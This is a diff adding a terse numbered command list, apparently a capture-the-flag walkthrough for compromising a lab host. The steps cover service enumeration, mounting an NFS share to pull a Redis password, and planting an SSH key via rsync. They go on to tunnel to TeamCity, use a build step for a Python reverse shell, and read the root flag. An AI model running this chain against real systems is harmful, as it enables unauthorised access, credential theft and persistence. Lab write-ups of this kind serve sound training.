@@ -1,0 +1,18 @@
+1 - nmap -A 10.10.204.148
+2 - smbclient -L \\10.10.204.148
+3 - smbclient \\\\10.10.204.148\\shares
+4 - cat services.txt
+5 - mnt -t nfs 10.10.204.148: /mnt/internal
+6 - cat /mnt/internal/opt/conf/redis/redis.conf | grep "pass"
+7 - redis-cli -h 10.10.204.148 -a PASS
+8 - >GET internal_flag
+9 - >LRANGE authlist 1 3 -> BASE64 DECODE
+10 - cp ~/.ssh/id_rsa.pub mykey
+11 - rsync mykey rsync://rsync-connect@10.10.204.148/files/sys-internal/.ssh
+12 - ssh sys-internal@10.10.204.148
+13 - netstat -tuna
+14 - ssh -L 8111:127.0.0.1:8111 sys-internal@10.10.204.148
+15 - cat /TeamCity/logs/catalina.out 2>/dev/null
+16 - Build Steps -> Custom Script -> PYTHON REVERSE SHELL
+17 - whoami
+18 - cat /root/root.txt
